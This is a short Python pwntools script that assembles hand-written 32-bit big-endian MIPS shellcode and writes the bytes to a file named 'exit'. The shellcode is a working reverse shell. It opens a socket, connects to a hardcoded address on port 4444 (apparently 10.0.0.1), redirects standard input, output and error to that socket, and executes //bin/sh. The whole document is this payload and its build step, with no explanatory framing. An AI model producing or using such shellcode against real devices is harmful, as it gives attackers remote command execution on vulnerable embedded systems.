from pwn import *

context.clear()
context.arch = 'mips'
context.bits = 32
context.endian = 'big'

sc = ''' 
    
/* open new socket */
/* call socket(2, SOCK_STREAM (2), 0) */
    li $a0, 2
    li $a2, 0 
    li $v0, SYS_socket
    li $a1, 2
    syscall 0x40404

/* save opened socket */
    move $s0 , $v0

/* push sockaddr, connect() */
/* push '\x00\x02\x11\\\n\x00\x00\x01' */
    li $t1 , 0x2115c
    sw $t1, -8($sp)
    li $t9, 0xa000001
    sw $t9, -4($sp)
    addiu $sp, $sp, -8

/* call connect('$s0', '$sp', 0x10) */
    move $a0, $s0
    move $a1, $sp
    li $a2, 0x10
    li $v0, SYS_connect
    syscall 0x40404

/* call dup2('$s0', 0) */
    move $a0, $s0            
    li $a1 , 0 
    li $v0, SYS_dup2
    syscall 0x40404          
 
/* call dup2('$s0', 1) */
    move $a0, $s0       
    li $a1 , 1          
    li $v0, SYS_dup2
    syscall 0x40404     
 
/* call dup2('$s0', 2)  */
    move $a0, $s0        
    li $a1 , 2 
    li $v0, SYS_dup2
    syscall 0x40404      

/* push argument array ['sh\x00'] */
/* push 'sh\x00\x00' */
    li $t1, 0x73680000
    sw $t1, -4($sp)
    addiu $sp, $sp, -4
    li $a1, 0
    sw $a1, -4($sp)
    addi $sp, $sp, -4 /* null terminate */
    li $a1, 4
    add $a1, $sp , $a1
    sw $a1, -4($sp)
    addi $sp, $sp, -4 /* 'sh\x00' */
    move $a1, $sp
    
/* push argument array [] */
/* push '\x00' */
    sw $zero, -4($sp)
    addiu $sp, $sp, -4 
    li $a2, 0
    sw $a2, -4($sp)
    addi $sp, $sp, -4 /* null terminate */
    move $a2, $sp 
    
/* push '//bin/sh\x00' */
    li $t1, 0x2f2f6269
    sw $t1, -12($sp)
    li $t1, 0x6e2f7368
    sw $t1, -8($sp)
    sw $zero, -4($sp)
    addiu $sp, $sp, -12
    
/* call execve('$sp', '$a1', '$a2') */
    move $a0, $sp
    li $v0, SYS_execve
    syscall 0x40404

/* call exit(0) */
    li $a0, 0
    li $v0, SYS_exit
    syscall 0x40404
    nop

'''

x = asm(sc)
print '0x%x' % len(x)



o = open('exit', 'wb')
o.write(x)
o.flush()
o.close()
